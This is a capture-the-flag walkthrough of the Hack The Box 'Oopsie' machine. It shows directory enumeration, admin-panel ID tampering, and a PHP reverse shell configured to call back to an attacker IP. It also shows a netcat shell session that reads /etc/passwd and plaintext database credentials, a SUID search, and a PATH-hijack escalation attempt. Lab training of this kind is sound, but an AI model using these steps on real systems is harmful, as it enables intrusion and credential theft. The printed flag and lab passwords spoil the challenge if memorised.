# Oopsie
_______

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/f3b6eb49-52df-4aee-8fba-42110bd94ccf)


#### Directory Enumeration
```
┌──(melle㉿tuguldur)-[~/Downloads]
└─$ gobuster dir  -u http://10.129.2.130/cdn-cgi -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.2.130/cdn-cgi
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
Progress: 123 / 4615 (2.67%)[ERROR] Get "http://10.129.2.130/cdn-cgi/~http": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 124 / 4615 (2.69%)[ERROR] Get "http://10.129.2.130/cdn-cgi/~httpd": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 125 / 4615 (2.71%)[ERROR] Get "http://10.129.2.130/cdn-cgi/~mail": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/~root": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/~operator": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/~nobody": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/~lp": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/~logs": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/~log": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 134 / 4615 (2.90%)[ERROR] Get "http://10.129.2.130/cdn-cgi/~sys": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 813 / 4615 (17.62%)[ERROR] Get "http://10.129.2.130/cdn-cgi/certified": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/certsrv": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/certs": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/cfc": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/cf": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/certserver": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/cfcache": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/cfdocs": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/cfg": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 822 / 4615 (17.81%)[ERROR] Get "http://10.129.2.130/cdn-cgi/cfide": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 1556 / 4615 (33.72%)[ERROR] Get "http://10.129.2.130/cdn-cgi/externalization": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/externalid": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/extra": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 2153 / 4615 (46.65%)[ERROR] Get "http://10.129.2.130/cdn-cgi/javascript": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/java-plugin": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/javascripts": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/javax": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/java-sys": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/jboss": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/jbossas": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/jdbc": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/login                (Status: 301) [Size: 320] [--> http://10.129.2.130/cdn-cgi/login/]
Progress: 2828 / 4615 (61.28%)[ERROR] Get "http://10.129.2.130/cdn-cgi/owners": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/ows": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/ows-bin": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/p": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/P": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/p2p": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/p7pm": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/pa": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/pack": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/package": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 3280 / 4615 (71.07%)[ERROR] Get "http://10.129.2.130/cdn-cgi/rarticles": dial tcp 10.129.2.130:80: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/rate": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 4489 / 4615 (97.27%)[ERROR] Get "http://10.129.2.130/cdn-cgi/world": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/worldwide": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 4492 / 4615 (97.33%)[ERROR] Get "http://10.129.2.130/cdn-cgi/wp-atom": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/wpau-backup": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/wow": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/wp-admin": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/wp-app": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/wp": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 4498 / 4615 (97.46%)[ERROR] Get "http://10.129.2.130/cdn-cgi/wp-blog-header": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/ffc0bd9e-f4ec-48d5-a038-9672f77242e1)




![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/1438eeb0-552b-4305-bd35-0bbde379eef4)


![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/8548774d-fbf0-4cab-b08f-27c33d3872d1)

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/88c61aaa-4284-4f66-87db-60edc301a9cf)

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/770a3558-9ece-4804-9d0b-0c8698571fdf)


` 10.129.95.191/cdn-cgi/login/admin.php?content=accounts&id=1`

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/1dbbccd0-a72f-4ac0-8424-f9f856b2b5cb)

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/11ff3aef-62d9-4cf3-9574-be4b19581a06)

php_reverse_shell

```set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.16.153';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

```

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/4a3422ca-b1a5-48a1-a30e-c9c0c999a093)

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/f71b9185-b6c0-4a98-b03b-28ff88dac460)

```
$ su robert
su: must be run from a terminal
```

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/0e4b1a57-cd6b-4198-bacb-030fbf1a1b29)

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/fa2b3ed2-2952-40e3-b2cd-7e4006e1b531)


![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/fea96485-810b-412a-b0a8-f6fa741eba77)



##### history 
```
┌──(melle㉿tuguldur)-[~/Downloads/php-reverse-shell]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.153] from (UNKNOWN) [10.129.113.207] 37744
Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 08:30:44 up 14 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ ls
cd /var/vbin
boot
cdrom
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
  
cd /var//bin/sh: 3        
can't cd to /va
$ c$cd /var/www/html
$ ls
cdn-cgi
css
fonts
images
index.php
js
themes
uploads
cd /cdn-cgi
/bin/sh: 7: /cdn-cgi: not found
$ ls
cdn-cgi
css
fonts
images
index.php
js
themes
uploads
$ cd /cdn-cgi
/bin/sh: 9: cd: can't cd to /cdn-cgi
$ cd cdn-cgi
$ ls
login
$ cd login
$ ls
admin.php
db.php
index.php
script.js
$ cat admin.php
<?php
include("db.php");
if($_COOKIE["user"]==="34322" || $_COOKIE["user"]==="86575" || $_COOKIE["user"]==="2233")
{
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Admin Panel</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel='stylesheet' href='/css/bootstrap.min.css'>
<link rel='stylesheet' href='/css/ionicons.min.css'>
<style>
.container {
  max-width: 960px;
}
.navbar-survival101 {
  background-color:#2B6DAD;
}
/* .navbar-survival101 .navbar-brand {
  margin-right: 2.15rem;
  padding: 3px 0 0 0;
  line-height: 36px;
} */

.navbar-survival101 .navbar-brand img {
  vertical-align: baseline;
}

.navbar-expand-lg .navbar-nav .nav-link {
  color: #fff;
}

.search-box {
  position: relative;
  height: 34px;
}
.search-box input {
  border: 0;
  border-radius: 3px !important;
  padding-right: 28px;
  font-size: 15px;
}

.search-box .input-group-btn {
  position: absolute;
  right: 0;
  top: 0;
  z-index: 999;
}

.search-box .input-group-btn button {
  background-color: transparent;
  border: 0;
  padding: 4px 8px;
  color: rgba(0,0,0,.4);
  font-size: 20px;
}

.search-box .input-group-btn button:hover,
.search-box .input-group-btn button:active,
.search-box .input-group-btn button:focus {
  color: rgba(0,0,0,.4);
}

@media (min-width: 992px) {
  .navbar-expand-lg .navbar-nav .nav-link {
    padding-right: .7rem;
    padding-left: .7rem;
  }

.new {
  font-family: arial, sans-serif;
  border-collapse: collapse;
  width:30%;
}

table {
  font-family: arial, sans-serif;
  border-collapse: collapse;
  width: 60%;
}

td, th {
  border: 1px solid #dddddd;
  text-align: center;
  padding: 8px;
}

tr:nth-child(even) {
  background-color: #dddddd;
} 
  .search-box {
    width: 300px !important;
  }
}

.caroulsel {
  width: 100%;
  overflow: hidden;
  padding: 5px 0 5px 5px;
}

.caroulsel-wrap {
  white-space: nowrap;
  font-size: 0;
}

.caroulsel-wrap a {
  display: inline-block;
  width: 134px;
  height: 92px;
  background-color: silver;
  border: #ccc 1px solid;
  margin-right: 5px;
}
</style>
<script>
  window.console = window.console || function(t) {};
</script>
<script>
  if (document.location.search.match(/type=embed/gi)) {
    window.parent.postMessage("resize", "*");
  }
</script>
</head>
<body translate="no">
<nav class="navbar navbar-expand-lg navbar-dark navbar-survival101">
<div class="container">
<a class="navbar-brand" href="#">
MegaCorp Automotive
</a>
<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarColor02" aria-controls="navbarColor02" aria-expanded="false" aria-label="Toggle navigation">
<span class="navbar-toggler-icon"></span>
</button>
<div class="collapse navbar-collapse" id="navbarColor02">
<ul class="navbar-nav mr-auto">
<li class="nav-item active">
<a class="nav-link" href="/cdn-cgi/login/admin.php?content=accounts&id=2">Account<span class="sr-only">(current)</span></a>
</li>
<li class="nav-item">
<a class="nav-link" href="/cdn-cgi/login/admin.php?content=branding&brandId=2">Branding</a>
</li>
<li class="nav-item">
<a class="nav-link" href="/cdn-cgi/login/admin.php?content=clients&orgId=2">Clients</a>
</li>
<li class="nav-item">
<a class="nav-link" href="/cdn-cgi/login/admin.php?content=uploads">Uploads</a></li>
<li class="nav-item">
	<a class="nav-link" href="#">Logged in as Guest</a>
</li>
</ul>
<form class="form-inline">
</span>
</div>
</form>
</div>
</div>
</nav>
<br /><br /><center><h1>Repair Management System</h1><br /><br />
<?php
if($_GET["content"]==="branding" && $_GET["brandId"]!="")
{
	$stmt=$conn->prepare("select model,price from branding where id=?");
	$stmt->bind_param('i',$_GET["brandId"]);
	$stmt->execute();
	$stmt=$stmt->get_result();
	$stmt=$stmt->fetch_assoc();
	$model=$stmt["model"];
	$price=$stmt["price"];
	echo '<table><tr><th>Brand ID</th><th>Model</th><th>Price</th></tr><tr><td>'.$_GET["brandId"].'<td>'.$model.'</td><td>'.$price.'</td></tr></table';
}
	else
	{
		if($_GET["content"]==="clients"&&$_GET["orgId"]!="")
		{
			$stmt=$conn->prepare("select name,email from clients where id=?");
			$stmt->bind_param('i',$_GET["orgId"]);
			$stmt->execute();
			$stmt=$stmt->get_result();
			$stmt=$stmt->fetch_assoc();
			$name=$stmt["name"];
			$email=$stmt["email"];
			echo '<table><tr><th>Client ID</th><th>Name</th><th>Email</th></tr><tr><td>'.$_GET["orgId"].'</td><td>'.$name.'</td><td>'.$email.'</td></tr></table';
		}
		else
		{
			if($_GET["content"]==="accounts"&&$_GET["id"]!="")
			{
	                        $stmt=$conn->prepare("select access,name,email from accounts where id=?");
	                        $stmt->bind_param('i',$_GET["id"]);
	                        $stmt->execute();
	                        $stmt=$stmt->get_result();
	                        $stmt=$stmt->fetch_assoc();
				$id=$stmt["access"];
	                        $name=$stmt["name"];
	                        $email=$stmt["email"];
	                        echo '<table><tr><th>Access ID</th><th>Name</th><th>Email</th></tr><tr><td>'.$id.'</td><td>'.$name.'</td><td>'.$email.'</td></tr></table';
			}
			else
			{
				if($_GET["content"]==="uploads")
				{
					if($_COOKIE["user"]==="2233")
					{
						echo 'This action require super admin rights.';
					}
					else
					{
						if($_GET["action"]==="upload")
						{
							$target_dir = "/var/www/html/uploads/";
							$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
							if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
							        echo "The file ". basename( $_FILES["fileToUpload"]["name"]). " has been uploaded.";
							    } else {
									echo "Sorry, there was an error uploading your file.";
    								}				}else{	?>

<h2>Branding Image Uploads</h2><br /><form action="/cdn-cgi/login/admin.php?content=uploads&action=upload" method="POST" enctype="multipart/form-data">
<table class="new"><tr><td>Brand Name</td><td><input name="name" type="text"/></td></tr><tr><td colspan="2"><input type="file" name="fileToUpload"/><input type="submit" value="Upload"/></td></tr></table></form>
<?php	} }

				}
				else {
					?><img src="/images/3.jpg"/>
				<?php }
			}
		}
	}?>
<script src='/js/jquery.min.js'></script>
<script src='/js/bootstrap.min.js'></script>
</body>
</html>
<?php }
else
{
	header('Location: /cdn-cgi/login/index.php');
}
?>
$ cat * | grep -i passw*
if($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")
<input type="password" name="password" placeholder="Password" />
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
robert:x:1000:1000:robert:/home/robert:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
$ ls
admin.php
db.php
index.php
script.js
$ cat db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
$ su robert
su: must be run from a terminal
$ su robert
su: must be run from a terminal
$ ls
admin.php
db.php
index.php
script.js
$ sudo su 
sudo: no tty present and no askpass program specified
$ su robert
su: must be run from a terminal
$ su robert
su: must be run from a terminal
s$ su robert
/bin/sh: 25: ssu: not found
$ su robert
su: must be run from a terminal
$ ls   
admin.php
db.php
index.php
script.js
$ su robert
su: must be run from a terminal
$ sudo su robert
sudo: no tty present and no askpass program specified
$ cd robert
/bin/sh: 30: cd: can't cd to robert
$ su robert
su: must be run from a terminal
$ find / -perm -u=s -type f 2>/dev/null
/snap/core/11420/bin/mount
/snap/core/11420/bin/ping
/snap/core/11420/bin/ping6
/snap/core/11420/bin/su
/snap/core/11420/bin/umount
/snap/core/11420/usr/bin/chfn
/snap/core/11420/usr/bin/chsh
/snap/core/11420/usr/bin/gpasswd
/snap/core/11420/usr/bin/newgrp
/snap/core/11420/usr/bin/passwd
/snap/core/11420/usr/bin/sudo
/snap/core/11420/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/11420/usr/lib/openssh/ssh-keysign
/snap/core/11420/usr/lib/snapd/snap-confine
/snap/core/11420/usr/sbin/pppd
/snap/core/11743/bin/mount
/snap/core/11743/bin/ping
/snap/core/11743/bin/ping6
/snap/core/11743/bin/su
/snap/core/11743/bin/umount
/snap/core/11743/usr/bin/chfn
/snap/core/11743/usr/bin/chsh
/snap/core/11743/usr/bin/gpasswd
/snap/core/11743/usr/bin/newgrp
/snap/core/11743/usr/bin/passwd
/snap/core/11743/usr/bin/sudo
/snap/core/11743/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/11743/usr/lib/openssh/ssh-keysign
/snap/core/11743/usr/lib/snapd/snap-confine
/snap/core/11743/usr/sbin/pppd
/bin/fusermount
/bin/umount
/bin/mount
/bin/ping
/bin/su
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/newuidmap
/usr/bin/passwd
/usr/bin/at
/usr/bin/bugtracker
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/newgidmap
/usr/bin/gpasswd
/usr/bin/sudo
$ find / -perm -g=s -type f 2>/dev/null
/snap/core/11420/sbin/pam_extrausers_chkpwd
/snap/core/11420/sbin/unix_chkpwd
/snap/core/11420/usr/bin/chage
/snap/core/11420/usr/bin/crontab
/snap/core/11420/usr/bin/dotlockfile
/snap/core/11420/usr/bin/expiry
/snap/core/11420/usr/bin/mail-lock
/snap/core/11420/usr/bin/mail-touchlock
/snap/core/11420/usr/bin/mail-unlock
/snap/core/11420/usr/bin/ssh-agent
/snap/core/11420/usr/bin/wall
/snap/core/11743/sbin/pam_extrausers_chkpwd
/snap/core/11743/sbin/unix_chkpwd
/snap/core/11743/usr/bin/chage
/snap/core/11743/usr/bin/crontab
/snap/core/11743/usr/bin/dotlockfile
/snap/core/11743/usr/bin/expiry
/snap/core/11743/usr/bin/mail-lock
/snap/core/11743/usr/bin/mail-touchlock
/snap/core/11743/usr/bin/mail-unlock
/snap/core/11743/usr/bin/ssh-agent
/snap/core/11743/usr/bin/wall
/sbin/unix_chkpwd
/sbin/pam_extrausers_chkpwd
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/utempter/utempter
/usr/bin/bsd-write
/usr/bin/chage
/usr/bin/expiry
/usr/bin/wall
/usr/bin/mlocate
/usr/bin/at
/usr/bin/crontab
/usr/bin/ssh-agent
$ pushd /usr/bin
/bin/sh: 34: pushd: not found
$ ls -la bugtracker
ls: cannot access 'bugtracker': No such file or directory
$ ls
admin.php
db.php
index.php
script.js
$ cat /root/reports
cat: /root/reports: Permission denied
$ pwd
/var/www/html/cdn-cgi/login
$ cd ../..
$ ls
cdn-cgi
css
fonts
images
index.php
js
themes
uploads
$ pwd
/var/www/html
$ cd ..

$ ls
$ ls
html
$ html
$ cd /home
$ ls
robert
$ cd robert
$ ls
user.txt
$ cat user.txt
f2c74ee8db7983851ab2a96a44eb7981
$ pwd
/home/robert
$ mysql -u "robert" -D "garage"
ERROR 1045 (28000): Access denied for user 'robert'@'localhost' (using password: NO)
$ mysql -u "robert" -D "garage" --password="M3g4C0rpUs3r!"
mysql: [Warning] Using a password on the command line interface can be insecure.
ls
ls
pwd
\c
\q
$ mysql -u "robert" -p
Enter password: MEGACORP_4dm1n!!
ERROR 1045 (28000): Access denied for user 'robert'@'localhost' (using password: YES)
$ mysql -u "robert" -p
Enter password: M3g4C0rpUs3r!

\c
\q
$ cd /var/www/html
$ ls
cdn-cgi
css
fonts
images
index.php
js
themes
uploads
$ cd cdn-cgi
$ ls
login
cd login
$ ls
$ admin.php
db.php
index.php
script.js
cat db$cat db.php
cat: dcat: No such file or directory
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
$ mysql -u "robert" -D "garage" --password="M3g4C0rpUs3r!"
mysql: [Warning] Using a password on the command line interface can be insecure.
\c                   
\q
ls
$ admin.php
db.php
index.php
script.js
pwd
$ whoami
/var/www/html/cdn-cgi/login
$ whoami
www-data
$ www-data
$ su robert
su: must be run from a terminal
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ /usr/bin/bugtrucker
/bin/sh: 70: /usr/bin/bugtrucker: not found
$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
$ ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker               
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
/usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped
$ cd /tmp
$ ls
$ echo "/bin/sh" > cat
$ ls
cat
$ cd cat
/bin/sh: 77: cd: can't cd to cat
$ cat cat
/bin/sh
$ chmod +x cat
$ export PATH=/tmp:$PATH
$ $PATH
/bin/sh: 81: /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin: not found
$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
$ bugtracker
/bin/sh: 83: bugtracker: Permission denied
$ sudo bugtracker
sudo: no tty present and no askpass program specified
$ ru robert
/bin/sh: 85: ru: not found
$ su robert
su: must be run from a terminal
```












